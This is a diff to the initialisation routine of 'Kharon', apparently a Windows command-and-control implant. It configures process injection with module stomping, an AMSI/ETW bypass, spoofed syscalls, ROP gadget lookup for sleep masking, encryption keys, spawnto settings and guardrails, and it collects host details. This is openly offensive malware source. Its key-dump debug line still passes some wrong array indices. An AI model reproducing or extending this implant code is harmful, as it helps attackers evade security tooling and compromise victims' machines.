@@ -126,6 +126,9 @@ auto DECLFN Kharon::Init(
 
     GetConfig( &Cfg );
 
+    this->Config.Injection.TechniqueId = Cfg.Injection.TechniqueId;
+    this->Config.Injection.StompModule = Cfg.Injection.StompModule;
+
     this->Config.AmsiEtwBypass = Cfg.AmsiEtwBypass;
     this->Config.SleepTime     = Cfg.SleepTime;
     this->Config.Jitter        = Cfg.Jitter;
@@ -163,9 +166,9 @@ auto DECLFN Kharon::Init(
     this->Config.Web.PortQtt     = Cfg.Web.PortQtt;
     this->Config.Web.EndpointQtt = Cfg.Web.EndpointQtt;
 
-    this->Config.Web.Host     = (WCHAR**)this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Config.Web.HostQtt     * sizeof( WCHAR* ) );
-    this->Config.Web.Port     = (ULONG* )this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Config.Web.PortQtt     * sizeof( ULONG  ) );
-    this->Config.Web.EndPoint = (WCHAR**)this->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, this->Config.Web.EndpointQtt * sizeof( WCHAR* ) );
+    this->Config.Web.Host     = (WCHAR**)this->Ntdll.RtlAllocateHeap( (PVOID)this->Session.HeapHandle, HEAP_ZERO_MEMORY, this->Config.Web.HostQtt     * sizeof( WCHAR* ) );
+    this->Config.Web.Port     = (ULONG* )this->Ntdll.RtlAllocateHeap( (PVOID)this->Session.HeapHandle, HEAP_ZERO_MEMORY, this->Config.Web.PortQtt     * sizeof( ULONG  ) );
+    this->Config.Web.EndPoint = (WCHAR**)this->Ntdll.RtlAllocateHeap( (PVOID)this->Session.HeapHandle, HEAP_ZERO_MEMORY, this->Config.Web.EndpointQtt * sizeof( WCHAR* ) );
 
     COPY_WEB_ARRAY( this->Config.Web.Host,     Cfg.Web.Host,     this->Config.Web.HostQtt     );
     COPY_WEB_ARRAY( this->Config.Web.Port,     Cfg.Web.Port,     this->Config.Web.PortQtt     );
@@ -269,13 +272,10 @@ auto DECLFN Kharon::Init(
         this->Sys->Fetch( i );
     }
 
-    /* ========= [ set syscall flags ] ========= */
-    KhDbgz( "syscall: %X", this->Config.Syscall );
-
     /* ========= [ key generation to xor heap and package ] ========= */
     for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
         this->Crp->XorKey[i] = (BYTE)Rnd32();
-        // this->Crp->LokKey[i] = (BYTE)Rnd32();
+        this->Crp->LokKey[i] = (BYTE)Rnd32();
     }
 
     /* ========= [ informations collection ] ========= */
@@ -291,7 +291,6 @@ auto DECLFN Kharon::Init(
     ULONG  ProcBufferSize    = sizeof( cProcessorName );
     PCHAR  cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
 
-    OSVERSIONINFOA  OsVersion = { 0 };
     SYSTEM_INFO     SysInfo   = { 0 };
     MEMORYSTATUSEX  MemInfoEx = { 0 };
     TOKEN_ELEVATION Elevation = { 0 };
@@ -302,8 +301,6 @@ auto DECLFN Kharon::Init(
 
     this->Machine.AllocGran = SysInfo.dwAllocationGranularity;
     this->Machine.PageSize  = SysInfo.dwPageSize;
-
-    this->Krnl32.GetVersionExA( &OsVersion );
 
     this->Machine.OsMjrV  = NtCurrentPeb()->OSMajorVersion;
     this->Machine.OsMnrV  = NtCurrentPeb()->OSMinorVersion;
@@ -398,10 +395,11 @@ auto DECLFN Kharon::Init(
     this->Config.Mask.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
 
     if ( ! this->Config.Mask.NtContinueGadget ) {
+        KhDbgz("dont was possible found the NtContinue gadget, using NtContinue address\n");
         this->Config.Mask.NtContinueGadget = (UPTR)this->Ntdll.NtContinue;
     }
 
-    KhDbgz( "\n======== Session Informations ========" );
+    KhDbgz( "======== Session Informations ========" );
     KhDbgz( "Agent UUID: %s", this->Session.AgentID );
     KhDbgz( "Image Path: %s", this->Session.ImagePath );
     KhDbgz( "Command Line: %s", this->Session.CommandLine );
@@ -410,13 +408,13 @@ auto DECLFN Kharon::Init(
     KhDbgz( "Sleep Time: %d", this->Config.SleepTime );
     KhDbgz( "Jitter Time: %d\n", this->Config.Jitter );
 
-    KhDbgz( "Encryption Key[16] = 
-        [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] [%X] \n", 
+    KhDbgz( "Encryption Key[16] = "
+        "[0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] \n", 
         this->Crp->LokKey[0],  this->Crp->LokKey[1],  this->Crp->LokKey[2],  this->Crp->LokKey[0], 
         this->Crp->LokKey[3],  this->Crp->LokKey[4],  this->Crp->LokKey[5],  this->Crp->LokKey[0], 
         this->Crp->LokKey[6],  this->Crp->LokKey[7],  this->Crp->LokKey[8],  this->Crp->LokKey[0], 
         this->Crp->LokKey[9],  this->Crp->LokKey[10], this->Crp->LokKey[11], this->Crp->LokKey[12], 
-        this->Crp->LokKey[13], this->Crp->LokKey[14], this->Crp->LokKey[14]
+        this->Crp->LokKey[13], this->Crp->LokKey[14], this->Crp->LokKey[15]
     );
 
     KhDbgz( "======== Machine Informations ========" );
@@ -472,7 +470,7 @@ auto DECLFN Kharon::Init(
         this->Config.Syscall == SYSCALL_SPOOF          ? "Spoof"            :
         this->Config.Syscall == SYSCALL_NONE           ? "None"             : "Unknown"
     );
-    KhDbgz("Spawnto: %s\n", this->Config.Postex.Spawnto);
+    KhDbgz("Spawnto: %S\n", this->Config.Postex.Spawnto);
 
     KhDbgz("======== Guardrails Settings ========");
     KhDbgz("User   Name: %s", this->Config.Guardrails.UserName);
